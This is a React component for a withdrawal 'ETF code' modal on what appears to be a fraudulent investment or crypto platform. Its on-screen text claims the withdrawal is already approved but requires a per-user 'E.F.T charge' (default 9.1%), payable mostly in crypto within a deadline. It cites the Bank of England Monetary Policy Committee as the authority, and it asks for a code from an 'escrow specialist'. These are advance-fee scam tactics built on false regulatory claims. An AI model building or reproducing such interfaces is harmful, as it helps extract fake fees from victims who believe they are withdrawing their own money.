"use client";

import React from "react";
import Image from "next/image";
import FlowModal from "@/components/modals/flow/flowModal";
import { Button } from "@/components/ui/button";
import { PinInput, PinInputGroup, PinInputInput } from "@/components/ui/pin-input";
import { getStageContent } from "@/lib/constants/withdrawal";
import type { WithdrawalRequest } from "@/lib/types/api";
import { useAuthStore } from "@/lib/store/auth";

interface EtfCodeModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onSubmit?: (code: string) => void;
  onCancel?: () => void;
  request: WithdrawalRequest;
  isLoading?: boolean;
  trigger?: React.ReactNode;
}

const EtfCodeModal = ({ 
  open, 
  onOpenChange, 
  onSubmit, 
  onCancel, 
  request,
  isLoading = false,
  trigger
}: EtfCodeModalProps) => {
  const [pinValue, setPinValue] = React.useState<string[]>([]);
  const { user } = useAuthStore();
  
  // Get dynamic charges from user with fallbacks
  const chargePercent = user?.charges?.percent || "9.1";
  const chargeDays = user?.charges?.days || "7 working days";
  
  const stageContent = getStageContent("etf_code", {
    amount: request.amount,
    percent: request.percent,
    showPercent: request.show_percent,
    message: request.message,
  });

  // Use code_length from request, fallback to stageContent
  const codeLength = request.code_length && request.code_length > 0 ? request.code_length : stageContent.codeLength;
  const codeString = pinValue.join("");
  const isValidCode = codeString.length === codeLength;

  const handleSubmit = () => {
    if (isValidCode) {
      onSubmit?.(codeString);
    }
  };

  const handleCancel = () => {
    onCancel?.();
    onOpenChange(false);
  };

  React.useEffect(() => {
    if (!open) {
      setPinValue([]);
    }
  }, [open]);

  return (
    <FlowModal
      trigger={trigger}
      open={open}
      onOpenChange={(next) => {
        if (!next) {
          setPinValue([]);
          handleCancel();
        }
        onOpenChange?.(next);
      }}
      eyebrow={stageContent.eyebrow}
      title={stageContent.title}
      subtitle={stageContent.subtitle}
      contentClassName="w-full max-w-2xl"
      dialogClassName="w-full sm:max-w-2xl"
    >
      <div className="space-y-6">
        <section className="rounded-2xl border border-gray-100/80 bg-white/95 p-5 text-center shadow-sm dark:border-white/10 dark:bg-gray-900">
          <div className="flex flex-col items-center gap-3">
            <Image src="/loading.gif" alt="Loading" width={180} height={180} className="h-24 w-24 sm:h-32 sm:w-32" />
            {typeof request.percent === 'number' && request.show_percent !== false && (
              <div className="text-sm font-semibold text-blue-700 dark:text-blue-300">
                {request.percent}%
              </div>
            )}
            {isLoading && (
              <p className="text-sm font-medium text-gray-600 dark:text-gray-300">
                {stageContent.processingMessage}
              </p>
            )}
          </div>
        </section>

        <section className="space-y-4 rounded-2xl border border-gray-100/60 bg-gray-50/70 p-5 text-left text-sm leading-relaxed text-gray-600 shadow-sm dark:border-white/10 dark:bg-gray-900/40 dark:text-gray-300">
          <p>
            For all electronic bank transfers, you&apos;re required to pay a rate of <strong>{chargePercent}% E.F.T charges for all transactions related to forex/crypto</strong> in compliance with the Bank of England Monetary Policy Committee (MPC).
          </p>
          <p>
            This is a mandatory payment for all investment-related earnings.
          </p>
          <div className="rounded-xl border border-amber-100 bg-white/80 p-4 text-amber-900 dark:border-amber-500/20 dark:bg-amber-500/10 dark:text-amber-50">
            <p className="text-xs font-semibold uppercase tracking-[0.3em] text-amber-500 dark:text-amber-200">Note</p>
            <p className="mt-1">
              Your withdrawal has been approved already and you can make the E.F.T transaction within the next <strong>{chargeDays}</strong>. After that window, rates may shift with market conditions.
            </p>
          </div>
          <p>
            EFT charges are mostly required to be made with crypto. Using a banking payment gateway could increase the required charges because your account opening was merged under crypto compliance.
          </p>
        </section>

        <section className="space-y-4 rounded-2xl border border-gray-100/60 bg-white/95 p-5 dark:border-white/10 dark:bg-gray-900">
          <p className="text-[11px] uppercase tracking-[0.4em] text-gray-500 dark:text-gray-400 text-center">
            {stageContent.codeLabel}
          </p>
          <PinInput
            value={pinValue}
            onValueChange={(details) => setPinValue(details.value)}
            otp
            blurOnComplete
          >
            <PinInputGroup className="flex flex-wrap items-center justify-center gap-1 sm:gap-2">
              {Array.from({ length: codeLength }).map((_, index) => (
                <PinInputInput
                  key={`etf-digit-${index}`}
                  index={index}
                  className="h-10 w-9 sm:h-12 sm:w-11 text-base sm:text-lg font-bold text-center uppercase tracking-[0.1em] border-2 rounded-lg sm:rounded-xl bg-white dark:bg-gray-900 border-gray-200 dark:border-gray-600 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 dark:focus:ring-indigo-900/30 transition-all"
                />
              ))}
            </PinInputGroup>
          </PinInput>
          <p className="text-center text-xs text-gray-500 dark:text-gray-400">
            Enter the compliance code shared by your escrow specialist to keep your withdrawal on schedule.
          </p>
        </section>

        <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
          <Button
            type="button"
            variant="outline"
            className="w-full cursor-pointer border border-gray-300 text-gray-700 hover:bg-gray-50 dark:border-white/10 dark:text-white sm:w-auto order-2 sm:order-1"
            onClick={handleCancel}
            disabled={isLoading}
          >
            Cancel
          </Button>
          <Button
            type="button"
            className="w-full cursor-pointer bg-indigo-600 text-white hover:bg-indigo-500 sm:w-auto order-1 sm:order-2"
            onClick={handleSubmit}
            disabled={!isValidCode || isLoading}
          >
            {isLoading ? "Processing..." : "Proceed"}
          </Button>
        </div>
      </div>
    </FlowModal>
  );
};

export default EtfCodeModal;
